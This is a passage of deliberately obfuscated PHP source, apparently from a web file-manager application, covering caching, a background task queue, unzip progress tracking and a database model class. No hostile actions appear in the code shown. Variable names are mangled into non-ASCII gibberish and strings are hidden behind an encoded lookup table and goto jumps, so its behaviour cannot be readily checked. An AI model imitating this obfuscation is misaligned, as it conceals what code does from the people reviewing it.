á³[$¨¹®¦Àñ[86]]; if (in_array($¸İï á³[$¨¹®¦Àñ[511]], $ğ¯îğ¡Ô)) { return !1; } if (!in_array($¸İï á³[$¨¹®¦Àñ[857]], $Í°÷ıÇ©)) { return !1; } if (IO::exist($ÄÎ÷ÃÒ¯)) { return !0; } $±³ÉÆ›å = get_path_father($ÄÎ÷ÃÒ¯); if (IO::exist($±³ÉÆ›å)) { $ğ¯îğ¡Ô[] = $¸İï á³[$¨¹®¦Àñ[511]]; return !1; } $ò©¸ÑÎò = array($¨¹®¦Àñ[857] => $¸İï á³[$¨¹®¦Àñ[857]], $¨¹®¦Àñ[86] => array($¨¹®¦Àñ[429], "{$±³ÉÆ›å}\x25")); $ÙóÚ—ŒÊ = Model($¨¹®¦Àñ[829])->where($ò©¸ÑÎò)->field($¨¹®¦Àñ[512])->select(); $ğ¯îğ¡Ô = array_merge($ğ¯îğ¡Ô, array_to_keyvalue($ÙóÚ—ŒÊ, $¨¹®¦Àñ[12], $¨¹®¦Àñ[511])); return !1; } private function _fileFilter($ÜºÕéß) { $§·š™¡ =& $_SERVER[èùÙ¹Ïö]; if (empty($ÜºÕéß)) { return; } $„ßÙ“œŒ = array($§·š™¡[511] => array($§·š™¡[7], array_unique($ÜºÕéß))); $”Š­ş¹ƒ = Model($§·š™¡[865])->where($„ßÙ“œŒ)->field($§·š™¡[183])->select(); foreach ($”Š­ş¹ƒ as $áûŒ°„”) { Model($§·š™¡[865])->remove($áûŒ°„”[$§·š™¡[183]], !1); } } private function storeIds() { $¡Û¨×Ó‘ =& $_SERVER[èùÙ¹Ïö]; $ÍøÚÒŠœ = Model($¡Û¨×Ó‘[807])->listData(); $êó“á¤ = array(); $ãÆí¢ = $GLOBALS[$¡Û¨×Ó‘[6]][$¡Û¨×Ó‘[91]][$¡Û¨×Ó‘[866]]; foreach ($ÍøÚÒŠœ as $€ŸÚãî) { $ëé×£…Û = strtolower($€ŸÚãî[$¡Û¨×Ó‘[97]]); if (!isset($ãÆí¢[$ëé×£…Û])) { continue; } $òšÛ”÷ˆ = $¡Û¨×Ó‘[76] . (isset($ãÆí¢[$ëé×£…Û]) ? $ãÆí¢[$ëé×£…Û] : ucfirst($ëé×£…Û)); if (!class_exists($òšÛ”÷ˆ)) { continue; } $êó“á¤[] = $€ŸÚãî[$¡Û¨×Ó‘[445]]; } return $êó“á¤; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $û“¦úÔ­ =& $_SERVER[èùÙ¹Ïö]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $êû¸ç““ = $GLOBALS[$û“¦úÔ­[6]][$û“¦úÔ­[395]]; $í ôÂÌÅ = $êû¸ç““[$êû¸ç““[$û“¦úÔ­[867]]]; $“Åó§ğ÷ = $êû¸ç““[$û“¦úÔ­[868]]; switch ($êû¸ç““[$û“¦úÔ­[867]]) { case $û“¦úÔ­[21]: self::$handle = Model($û“¦úÔ­[869]); break; case $û“¦úÔ­[870]: self::$handle = new CacheRedis($í ôÂÌÅ, $“Åó§ğ÷); break; case $û“¦úÔ­[871]: self::$handle = new CacheMemcached($í ôÂÌÅ, $“Åó§ğ÷); break; case $û“¦úÔ­[216]: self::$handle = new CacheFile($í ôÂÌÅ, $“Åó§ğ÷); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ÖâŒ­…Û) { if (is_array($ÖâŒ­…Û) || is_object($ÖâŒ­…Û)) { $ÖâŒ­…Û = json_encode($ÖâŒ­…Û); } $ÖâŒ­…Û = rawurlencode($ÖâŒ­…Û); return md5(KOD_SITE_ID . $_SERVER[èùÙ¹Ïö][11] . $ÖâŒ­…Û); } public static function get($ïøü½Ÿ, $õéâÎüœ = false) { $…©çşÚ = self::key($ïøü½Ÿ); $ºŸ‚¤”í = self::init(); if ($õéâÎüœ) { return unserialize($ºŸ‚¤”í->get($…©çşÚ)); } if (!isset(self::$memoryCache[$…©çşÚ])) { $ÓÓÆ¸¬œ = $ºŸ‚¤”í->get($…©çşÚ); self::$memoryCache[$…©çşÚ] = unserialize($ÓÓÆ¸¬œ); } return self::$memoryCache[$…©çşÚ]; } public static function set($ÒŞ¯à’–, $ÆÔùÊÍÀ, $İõÙÂ‡§ = false) { $×˜Ú¤Æ =& $_SERVER[èùÙ¹Ïö]; $©ï“– = self::key($ÒŞ¯à’–); if (isset(self::$memoryCache[$©ï“–]) && self::$memoryCache[$©ï“–] === $ÆÔùÊÍÀ) { return !0; } if ($İõÙÂ‡§ === 0) { self::$memoryCache[$©ï“–] = $ÆÔùÊÍÀ; return !0; } $•åı÷Ö = self::init(); $Î¹ÚÏ = serialize($ÆÔùÊÍÀ); CacheLock::lock($ÒŞ¯à’– . $×˜Ú¤Æ[872]); $™Ìâî÷‹ = $•åı÷Ö->set($©ï“–, $Î¹ÚÏ, $İõÙÂ‡§); self::$memoryCache[$©ï“–] = $ÆÔùÊÍÀ; CacheLock::unlock($ÒŞ¯à’– . $×˜Ú¤Æ[872]); return $™Ìâî÷‹; } public static function getCall($ÀÉ„Õ‚±, $˜À•ãòô, $×î§Æı‡, $¹’œÀ¹ = array()) { $Üõ«ÎÒÂ =& $_SERVER[èùÙ¹Ïö]; $òØ¹š Å = self::get($ÀÉ„Õ‚±); if ($òØ¹š Å || $òØ¹š Å === $Üõ«ÎÒÂ[12]) { return $òØ¹š Å; } $òØ¹š Å = call_user_func_array($×î§Æı‡, $¹’œÀ¹); $òØ¹š Å = $òØ¹š Å ? $òØ¹š Å : $Üõ«ÎÒÂ[12]; self::set($ÀÉ„Õ‚±, $òØ¹š Å, $˜À•ãòô); return $òØ¹š Å; } public static function remove($³ÏÑ‚ı¦) { $¢ğğ¿Ç = self::key($³ÏÑ‚ı¦); unset(self::$memoryCache[$¢ğğ¿Ç]); self::clearTimeout(); CacheLock::lock($³ÏÑ‚ı¦); $åêÊ¾‹® = self::init()->remove($¢ğğ¿Ç); CacheLock::unlock($³ÏÑ‚ı¦); return $åêÊ¾‹®; } public static function removeMemory($Öú‚Ç½¶) { $ßÃ¨€÷® = self::key($Öú‚Ç½¶); unset(self::$memoryCache[$ßÃ¨€÷®]); } public static function clearMemory($İÓåƒâ = false) { if ($İÓåƒâ) { $İÓåƒâ = self::key($İÓåƒâ); unset(self::$memoryCache[$İÓåƒâ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[èùÙ¹Ïö][873])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[èùÙ¹Ïö][874])) { self::init()->clearTimeout(); } } } goto fáÌ×…ßœ¬; FÕ–Ô’ç¦: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\x73\x6b\121\x75\145\165\145\114\145\156\x67\x74\150"; const QUEUE_DATA = "\164\141\x73\x6b\121\x75\x65\165\x65\104\x61\164\141"; const QUEUE_TIME = "\x74\141\x73\153\x51\x75\145\x75\x65\114\141\163\164\122\165\x6e"; const QUEUE_THREAD = "\164\141\163\x6b\121\x75\145\x75\x65\x54\x68\x72\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($êÄØ‰ûÅ, $Ù›º²ôÁ = array(), $ÜŒîÎØ­ = '', $¸ÎİĞ¥¶ = '') { $ôû‚Íìˆ =& $_SERVER[èùÙ¹Ïö]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¸ÎİĞ¥¶ && array_find_by_field(self::$listData, $ôû‚Íìˆ[96], $¸ÎİĞ¥¶)) { return !0; } if ($¸ÎİĞ¥¶ && array_find_by_field(self::$listDataAdd, $ôû‚Íìˆ[96], $¸ÎİĞ¥¶)) { return !0; } self::$listDataAdd[] = array($ôû‚Íìˆ[310] => $êÄØ‰ûÅ, $ôû‚Íìˆ[1794] => $Ù›º²ôÁ, $ôû‚Íìˆ[496] => $ÜŒîÎØ­, $ôû‚Íìˆ[96] => $¸ÎİĞ¥¶); return !0; } public static function addSubmit() { $ÁÃ«Ú›Ğ =& $_SERVER[èùÙ¹Ïö]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ÁÃ«Ú›Ğ[1795] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ÁÃ«Ú›Ğ[12], $ÁÃ«Ú›Ğ[496])), $ÁÃ«Ú›Ğ[187]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($á”ÕÔ¬ı, $óÅ”Õ¸‘ = array(), $ŸìİÁ×Î = '', $ò†Õ´øã = '') { $ò ±ì©â =& $_SERVER[èùÙ¹Ïö]; if (self::count() >= self::MAX_LENGTH) { return !1; } $õÙó¿È = self::getAll(); if ($ò†Õ´øã && array_find_by_field($õÙó¿È, $ò ±ì©â[96], $ò†Õ´øã)) { return !0; } $õÙó¿È[] = array($ò ±ì©â[310] => $á”ÕÔ¬ı, $ò ±ì©â[1794] => $óÅ”Õ¸‘, $ò ±ì©â[496] => $ŸìİÁ×Î, $ò ±ì©â[96] => $ò†Õ´øã); self::setAll($õÙó¿È); write_log($ò ±ì©â[1795] . $ŸìİÁ×Î, $ò ±ì©â[187]); return !0; } public static function run() { $½×º³ñî =& $_SERVER[èùÙ¹Ïö]; $ ¹¤Åù = self::getAll(); $©Ø‚·Ú = array_shift($ ¹¤Åù); if (!$©Ø‚·Ú) { return !1; } self::setAll($ ¹¤Åù); $õ‚¿„‚ = timeFloat(); $´ àÌŞ = $½×º³ñî[12]; try { $´ àÌŞ = Hook::apply($©Ø‚·Ú[$½×º³ñî[310]], $©Ø‚·Ú[$½×º³ñî[1794]]); } catch (Exception $ë²¬¤şó) { write_log($ë²¬¤şó, $½×º³ñî[1230]); } $è·ø¶Ï = number_format(timeFloat() - $õ‚¿„‚, 3) . $½×º³ñî[1712]; if ($´ àÌŞ && is_string($´ àÌŞ)) { $è·ø¶Ï = $è·ø¶Ï . $½×º³ñî[1796] . $´ àÌŞ; } write_log($½×º³ñî[1797] . $©Ø‚·Ú[$½×º³ñî[496]] . $½×º³ñî[1798] . $è·ø¶Ï, $½×º³ñî[187]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ú§æ–úÂ =& $_SERVER[èùÙ¹Ïö]; $úÉ»ó¥ = self::threadCount() + 1; if ($úÉ»ó¥ > 3 || !self::count()) { return; } write_log($Ú§æ–úÂ[1799] . $úÉ»ó¥, $Ú§æ–úÂ[187]); Cache::set(self::QUEUE_THREAD, $úÉ»ó¥, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ú§æ–úÂ[1800], $Ú§æ–úÂ[187]); } public static function getKey($ ïÈŸüæ, $¯»¢´›Ş = "\151\x6e\x74") { $ÍÇÃ¦Óè =& $_SERVER[èùÙ¹Ïö]; Cache::removeMemory($ ïÈŸüæ); $ÜÓœ°çî = Cache::get($ ïÈŸüæ); if ($¯»¢´›Ş == $ÍÇÃ¦Óè[334]) { return $ÜÓœ°çî ? intval($ÜÓœ°çî) : 0; } if ($¯»¢´›Ş == $ÍÇÃ¦Óè[1801]) { return is_array($ÜÓœ°çî) ? $ÜÓœ°çî : array(); } return $ÜÓœ°çî; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[èùÙ¹Ïö][1801]); } public static function setAll($õãÀÕÃ˜) { $¦µŒÏ»Î = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($õãÀÕÃ˜), $¦µŒÏ»Î); Cache::set(self::QUEUE_DATA, $õãÀÕÃ˜, $¦µŒÏ»Î); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Çş÷äĞ€, $íõæ«‹Ã = 5.0) { if (!$Çş÷äĞ€) { return; } $¦éë»Ô± = Cache::get($Çş÷äĞ€); if (!$¦éë»Ô± || timeFloat() - floatVal($¦éë»Ô±) >= $íõæ«‹Ã) { Cache::set($Çş÷äĞ€, timeFloat(), $íõæ«‹Ã * 10); return !0; } return !1; } public static function timeLimitCall($¦ÛË°†, $Ñ³Ö¡·“, $ÙÑ¥Ï½±, $£™ÚÎìÌ = 5.0) { $“„Ñûˆ =& $_SERVER[èùÙ¹Ïö]; if (!$¦ÛË°† || !$Ñ³Ö¡·“) { return; } self::$asyncAdd = !0; $†„¡ªë = $“„Ñûˆ[1802]; $Œ÷õìˆĞ = Cache::get($†„¡ªë, !0); $ç†Êç®… = array($“„Ñûˆ[1803] => timeFloat(), $“„Ñûˆ[1804] => timeFloat(), $“„Ñûˆ[310] => $Ñ³Ö¡·“, $“„Ñûˆ[1794] => $ÙÑ¥Ï½±, $“„Ñûˆ[196] => $£™ÚÎìÌ); if (is_array($Œ÷õìˆĞ[$¦ÛË°†])) { $ç†Êç®…[$“„Ñûˆ[1804]] = $Œ÷õìˆĞ[$¦ÛË°†][$“„Ñûˆ[1804]]; } if (is_array($Œ÷õìˆĞ[$¦ÛË°†])) { if (timeFloat() - $Œ÷õìˆĞ[$¦ÛË°†][$“„Ñûˆ[1803]] < $ç†Êç®…[$“„Ñûˆ[196]] * 0.3) { return; } $ç†Êç®…[$“„Ñûˆ[1804]] = $Œ÷õìˆĞ[$¦ÛË°†][$“„Ñûˆ[1804]]; } $Œ÷õìˆĞ[$¦ÛË°†] = $ç†Êç®…; Cache::set($†„¡ªë, $Œ÷õìˆĞ, 60); Cache::removeMemory($†„¡ªë); write_log($“„Ñûˆ[1805] . $¦ÛË°† . $“„Ñûˆ[73] . $Ñ³Ö¡·“, $“„Ñûˆ[187]); } public static function timeLimitCallLoop() { $ôñ‡ˆöÆ =& $_SERVER[èùÙ¹Ïö]; $úçáû² = array($ôñ‡ˆöÆ[1806]); $¿ù¦ö–» = in_array(strtolower(ACTION), $úçáû²); if (!$¿ù¦ö–» && !self::$asyncAdd) { return; } $•ËĞÚå = $ôñ‡ˆöÆ[1802]; $ÁŸ²±Ç˜ = Cache::get($•ËĞÚå, !0); if (!$ÁŸ²±Ç˜ || count($ÁŸ²±Ç˜) <= 0) { return; } $ÀşµÀå = !1; $Ï¡‘ãê = timeFloat(); $·îšêßî = array(); foreach ($ÁŸ²±Ç˜ as $áîÌ€Ë´ => $¦ÍŞó©Œ) { if ($Ï¡‘ãê - $¦ÍŞó©Œ[$ôñ‡ˆöÆ[1804]] > $¦ÍŞó©Œ[$ôñ‡ˆöÆ[196]]) { $ÀşµÀå = !0; try { Hook::apply($¦ÍŞó©Œ[$ôñ‡ˆöÆ[310]], $¦ÍŞó©Œ[$ôñ‡ˆöÆ[1794]]); write_log($ôñ‡ˆöÆ[1807] . $áîÌ€Ë´ . $ôñ‡ˆöÆ[73] . $¦ÍŞó©Œ[$ôñ‡ˆöÆ[310]] . $ôñ‡ˆöÆ[1808] . ACTION, $ôñ‡ˆöÆ[187]); } catch (Exception $·Â“áğÈ) { } continue; } $·îšêßî[$áîÌ€Ë´] = $¦ÍŞó©Œ; } if (!$ÀşµÀå) { return; } if (!$·îšêßî) { return Cache::remove($•ËĞÚå); } Cache::set($•ËĞÚå, $·îšêßî, 60); Cache::removeMemory($•ËĞÚå); } public static function finished($òí¼ô‡Ÿ, $û“í«–Ğ) { $¸™†»¦Ğ =& $_SERVER[èùÙ¹Ïö]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¸™†»¦Ğ[310] => $òí¼ô‡Ÿ, $¸™†»¦Ğ[1794] => $û“í«–Ğ); } private static function finishedRun() { $´§âÑ—³ =& $_SERVER[èùÙ¹Ïö]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $—ğ³•†˜) { try { Hook::apply($—ğ³•†˜[$´§âÑ—³[310]], $—ğ³•†˜[$´§âÑ—³[1794]]); } catch (Exception $ÍÜ‚ÅãŒ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $µ®ºä‘‘ =& $_SERVER[èùÙ¹Ïö]; parent::startAfter(); Hook::bind($µ®ºä‘‘[1809], array($this, $µ®ºä‘‘[1810])); Hook::bind($µ®ºä‘‘[1241], array($this, $µ®ºä‘‘[1811])); Hook::bind($µ®ºä‘‘[1812], array($this, $µ®ºä‘‘[1813])); $‚¥İïîì =& $this->task; $‚¥İïîì[$µ®ºä‘‘[1814]] = $µ®ºä‘‘[1242]; if (!$‚¥İïîì[$µ®ºä‘‘[1592]]) { $‚¥İïîì[$µ®ºä‘‘[1592]] = LNG($µ®ºä‘‘[1815]); } } protected function endAfter() { $ü©…ø‚’ =& $_SERVER[èùÙ¹Ïö]; parent::endAfter(); Hook::unbind($ü©…ø‚’[1809], array($this, $ü©…ø‚’[1810])); Hook::unbind($ü©…ø‚’[1241], array($this, $ü©…ø‚’[1811])); Hook::unbind($ü©…ø‚’[1812], array($this, $ü©…ø‚’[1813])); } public function updateAfter() { $ˆëŠúÛ =& $_SERVER[èùÙ¹Ïö]; $‰çÎşÅà =& $this->task; if (!$‰çÎşÅà[$ˆëŠúÛ[826]] || !$‰çÎşÅà[$ˆëŠúÛ[803]]) { if ($‰çÎşÅà[$ˆëŠúÛ[1814]] != $ˆëŠúÛ[359]) { return; } } if ($‰çÎşÅà[$ˆëŠúÛ[1814]] == $ˆëŠúÛ[1242]) { $»›¼ù³ = 0; if ($‰çÎşÅà[$ˆëŠúÛ[1749]]) { $»›¼ù³ = $‰çÎşÅà[$ˆëŠúÛ[1750]] / $‰çÎşÅà[$ˆëŠúÛ[1749]]; } $‰çÎşÅà[$ˆëŠúÛ[1698]] = $»›¼ù³ * 0.3; } else { if ($‰çÎşÅà[$ˆëŠúÛ[1814]] == $ˆëŠúÛ[359]) { $»›¼ù³ = $‰çÎşÅà[$ˆëŠúÛ[1697]] / $‰çÎşÅà[$ˆëŠúÛ[826]]; $‰çÎşÅà[$ˆëŠúÛ[1698]] = 0.3 + $»›¼ù³ * 0.4; } else { if ($‰çÎşÅà[$ˆëŠúÛ[1814]] == $ˆëŠúÛ[109]) { $çÄØ›Í¹ = 0; if ($‰çÎşÅà[$ˆëŠúÛ[1751]] == $ˆëŠúÛ[109]) { $çÄØ›Í¹ = $‰çÎşÅà[$ˆëŠúÛ[1750]]; } $»›¼ù³ = ($‰çÎşÅà[$ˆëŠúÛ[1754]] + $çÄØ›Í¹) / $‰çÎşÅà[$ˆëŠúÛ[803]]; $‰çÎşÅà[$ˆëŠúÛ[1698]] = 0.3 + 0.4 + $»›¼ù³ * 0.3; } } } if ($‰çÎşÅà[$ˆëŠúÛ[1698]] > 0) { $¸€¡œô÷ = timeFloat() - $‰çÎşÅà[$ˆëŠúÛ[1700]] - $‰çÎşÅà[$ˆëŠúÛ[1703]]; $‰çÎşÅà[$ˆëŠúÛ[1704]] = $¸€¡œô÷ * (1 - $‰çÎşÅà[$ˆëŠúÛ[1698]]) / $‰çÎşÅà[$ˆëŠúÛ[1698]]; } } public function addFile($ƒşŒ¯®Ø) { $³ˆµßä¦ =& $_SERVER[èùÙ¹Ïö]; $´ë”ñÓ =& $this->task; $òƒ°ÒüÛ = IO::info($ƒşŒ¯®Ø); $´ë”ñÓ[$³ˆµßä¦[1747]] = $òƒ°ÒüÛ[$³ˆµßä¦[32]]; $´ë”ñÓ[$³ˆµßä¦[1749]] = $òƒ°ÒüÛ[$³ˆµßä¦[78]]; $´ë”ñÓ[$³ˆµßä¦[1750]] = 0; $´ë”ñÓ[$³ˆµßä¦[1110]] = $³ˆµßä¦[1770]; $´ë”ñÓ[$³ˆµßä¦[1751]] = $³ˆµßä¦[1242]; $´ë”ñÓ[$³ˆµßä¦[803]] = $òƒ°ÒüÛ[$³ˆµßä¦[78]]; $´ë”ñÓ[$³ˆµßä¦[826]] = 1; $£äí·÷¡ = 0; $´ë”ñÓ[$³ˆµßä¦[1758]] = array($³ˆµßä¦[1759] => $£äí·÷¡ + 1, $³ˆµßä¦[464] => $òƒ°ÒüÛ[$³ˆµßä¦[32]], $³ˆµßä¦[86] => $òƒ°ÒüÛ[$³ˆµßä¦[86]], $³ˆµßä¦[554] => $òƒ°ÒüÛ[$³ˆµßä¦[554]] ? $òƒ°ÒüÛ[$³ˆµßä¦[554]] : $òƒ°ÒüÛ[$³ˆµßä¦[86]]); $this->update(); } public function zipEvent($¸ß„Ûûë, $Ÿ”Àãü•, $ƒÎÒô«ı, $¨êù…Å) { $šşªÊğ¤ =& $_SERVER[èùÙ¹Ïö]; $Ú¡­İÚƒ =& $this->task; $Ú¡­İÚƒ[$šşªÊğ¤[1747]] = get_path_this($Ÿ”Àãü•); $Ú¡­İÚƒ[$šşªÊğ¤[1749]] = $¨êù…Å; $Ú¡­İÚƒ[$šşªÊğ¤[1750]] = $ƒÎÒô«ı; $Ú¡­İÚƒ[$šşªÊğ¤[1110]] = $¸ß„Ûûë == $šşªÊğ¤[1816] ? $šşªÊğ¤[1817] : $šşªÊğ¤[1818]; $Ú¡­İÚƒ[$šşªÊğ¤[1751]] = $šşªÊğ¤[12]; $Ú¡­İÚƒ[$šşªÊğ¤[803]] = $¨êù…Å; $Ú¡­İÚƒ[$šşªÊğ¤[1814]] = $šşªÊğ¤[359]; $this->update(); } public function unzipAfter($íòá­õ) { $Ö”ÒÊä• =& $_SERVER[èùÙ¹Ïö]; $Ã“½Ï•ñ =& $this->task; $Ã“½Ï•ñ[$Ö”ÒÊä•[1814]] = $Ö”ÒÊä•[109]; $¡Â‘Ë«Á = IO::infoWithChildren($íòá­õ); $¶İ‰ÒÑ¡ = 0; $Ã“½Ï•ñ[$Ö”ÒÊä•[1758]] = array($Ö”ÒÊä•[1759] => $¶İ‰ÒÑ¡ + 1, $Ö”ÒÊä•[464] => $¡Â‘Ë«Á[$Ö”ÒÊä•[32]], $Ö”ÒÊä•[86] => $¡Â‘Ë«Á[$Ö”ÒÊä•[86]], $Ö”ÒÊä•[554] => $¡Â‘Ë«Á[$Ö”ÒÊä•[554]] ? $¡Â‘Ë«Á[$Ö”ÒÊä•[554]] : $¡Â‘Ë«Á[$Ö”ÒÊä•[86]]); if ($¡Â‘Ë«Á[$Ö”ÒÊä•[33]] == $Ö”ÒÊä•[216]) { $Ã“½Ï•ñ[$Ö”ÒÊä•[826]] = 1; } else { $Ã“½Ï•ñ[$Ö”ÒÊä•[826]] = $¡Â‘Ë«Á[$Ö”ÒÊä•[81]][$Ö”ÒÊä•[79]]; } $Ã“½Ï•ñ[$Ö”ÒÊä•[1110]] = $Ö”ÒÊä•[12]; $Ã“½Ï•ñ[$Ö”ÒÊä•[1751]] = 0; $Ã“½Ï•ñ[$Ö”ÒÊä•[1697]] = 0; $Ã“½Ï•ñ[$Ö”ÒÊä•[1749]] = 0; $Ã“½Ï•ñ[$Ö”ÒÊä•[1750]] = 0; $Ã“½Ï•ñ[$Ö”ÒÊä•[1747]] = $Ö”ÒÊä•[12]; $Ã“½Ï•ñ[$Ö”ÒÊä•[1754]] = 0; $Ã“½Ï•ñ[$Ö”ÒÊä•[803]] = $¡Â‘Ë«Á[$Ö”ÒÊä•[78]]; $this->update(); self::log($Ö”ÒÊä•[1819] . json_encode(array($Ã“½Ï•ñ, $¡Â‘Ë«Á))); } public function nameParse($€»Í½½¢) { $Ù­Ÿõî± =& $_SERVER[èùÙ¹Ïö]; $ÓÚÖ¦Ø =& $this->task; if ($ÓÚÖ¦Ø[$Ù­Ÿõî±[1814]] == $Ù­Ÿõî±[1242]) { $ÓÚÖ¦Ø[$Ù­Ÿõî±[1814]] = $Ù­Ÿõî±[359]; $ÓÚÖ¦Ø[$Ù­Ÿõî±[1754]] = 0; $ÓÚÖ¦Ø[$Ù­Ÿõî±[803]] = 0; } $ú­Ø = get_path_this($€»Í½½¢); if (strstr($ú­Ø, $Ù­Ÿõî±[10])) { $ÓÚÖ¦Ø[$Ù­Ÿõî±[1697]] += 1; $ÓÚÖ¦Ø[$Ù­Ÿõî±[826]] += 1; } $ÓÚÖ¦Ø[$Ù­Ÿõî±[1747]] = $€»Í½½¢; $this->update(); } } goto DšëƒËï¾; fê‚ÖÒÈê—: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\145", "\x6f\162\x64\x65\162", "\141\x6c\x69\x61\x73", "\150\141\166\151\156\147", "\x67\162\x6f\x75\x70", "\154\x6f\143\x6b", "\144\x69\163\164\x69\156\143\164", "\x61\165\164\157", "\x66\x69\x6c\x74\x65\x72", "\166\x61\154\151\x64\141\x74\x65", "\x72\x65\x73\x75\x6c\164", "\x62\151\156\144", "\x74\x6f\x6b\145\156"); public function __construct($òÁöŞ¢Å = '', $³‹ĞÏî = '', $¾ÎáˆÖè = '') { $¦Ô’ÍÉ =& $_SERVER[èùÙ¹Ïö]; $this->_initialize(); if (!empty($òÁöŞ¢Å)) { if (strpos($òÁöŞ¢Å, $¦Ô’ÍÉ[10])) { list($this->dbName, $this->name) = explode($¦Ô’ÍÉ[10], $òÁöŞ¢Å); } else { $this->name = $òÁöŞ¢Å; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($³‹ĞÏî)) { $this->tablePrefix = $¦Ô’ÍÉ[12]; } elseif ($¦Ô’ÍÉ[12] != $³‹ĞÏî) { $this->tablePrefix = $³‹ĞÏî; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¦Ô’ÍÉ[290]); } $this->db(0, empty($this->connection) ? $¾ÎáˆÖè : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ü¯Ïùüè =& $_SERVER[èùÙ¹Ïö]; if (empty($this->fields)) { if (think_config($ü¯Ïùüè[291])) { $Ó×ÚìÜ¢ = $this->dbName ? $this->dbName : think_config($ü¯Ïùüè[292]); $ÀÇåıÈ‚ = think_var_cache($ü¯Ïùüè[293] . strtolower(get_path_this($Ó×ÚìÜ¢) . $ü¯Ïùüè[10] . $this->name)); if ($ÀÇåıÈ‚) { $µÆ¯É’î = think_config($ü¯Ïùüè[294]); if (empty($µÆ¯É’î) || $ÀÇåıÈ‚[$ü¯Ïùüè[295]] == $µÆ¯É’î) { $this->fields = $ÀÇåıÈ‚; return; } } } $this->flush(); } } public function flush() { $­¾³ÙĞ =& $_SERVER[èùÙ¹Ïö]; $this->db->setModel($this->name); $½Ê „² = $this->db->getFields($this->getTableName()); if (!$½Ê „²) { return !1; } $this->fields = array_keys($½Ê „²); $this->fields[$­¾³ÙĞ[296]] = !1; foreach ($½Ê „² as $î£ˆ¹½µ => $ˆ€ªÌ‹) { $Ë¹ı²½[$î£ˆ¹½µ] = $ˆ€ªÌ‹[$­¾³ÙĞ[33]]; if ($ˆ€ªÌ‹[$­¾³ÙĞ[39]]) { $this->fields[$­¾³ÙĞ[297]] = $î£ˆ¹½µ; if ($ˆ€ªÌ‹[$­¾³ÙĞ[42]]) { $this->fields[$­¾³ÙĞ[296]] = !0; } } } $this->fields[$­¾³ÙĞ[298]] = $Ë¹ı²½; if (think_config($­¾³ÙĞ[294])) { $this->fields[$­¾³ÙĞ[295]] = think_config($­¾³ÙĞ[294]); } if (think_config($­¾³ÙĞ[291])) { $òÊ±Äû¾ = $this->dbName ? $this->dbName : think_config($­¾³ÙĞ[292]); think_var_cache($­¾³ÙĞ[293] . strtolower(get_path_this($òÊ±Äû¾) . $­¾³ÙĞ[10] . $this->name), $this->fields); } } public function switchModel($˜ÉÙ‘„, $ºâÇî¶Í = array()) { $†÷ˆ—‚º =& $_SERVER[èùÙ¹Ïö]; $šàõ¯ã¤ = ucwords(strtolower($˜ÉÙ‘„)) . $†÷ˆ—‚º[299]; if (!class_exists($šàõ¯ã¤)) { think_exception($šàõ¯ã¤ . think_lang($†÷ˆ—‚º[300])); } $this->_extModel = new $šàõ¯ã¤($this->name); if (!empty($ºâÇî¶Í)) { foreach ($ºâÇî¶Í as $èÁ¨ÏÅ) { $this->_extModel->setProperty($èÁ¨ÏÅ, $this->{$èÁ¨ÏÅ}); } } return $this->_extModel; } public function __set($¼ğì÷©·, $ÑÄ‹Ûä–) { $this->data[$¼ğì÷©·] = $ÑÄ‹Ûä–; } public function __get($Ü¨›ƒñà) { return isset($this->data[$Ü¨›ƒñà]) ? $this->data[$Ü¨›ƒñà] : null; } public function __isset($¯”ñÙ±) { return isset($this->data[$¯”ñÙ±]); } public function __unset($õËƒ¿³í) { unset($this->data[$õËƒ¿³í]); } public function __call($Ãâ–ù¦, $ù¿µŸœ) { $Ïâ‘Şñç =& $_SERVER[èùÙ¹Ïö]; if (in_array(strtolower($Ãâ–ù¦), $this->methods, !0)) { $this->options[strtolower($Ãâ–ù¦)] = $ù¿µŸœ[0]; return $this; } elseif (in_array(strtolower($Ãâ–ù¦), array($Ïâ‘Şñç[301], $Ïâ‘Şñç[302], $Ïâ‘Şñç[303], 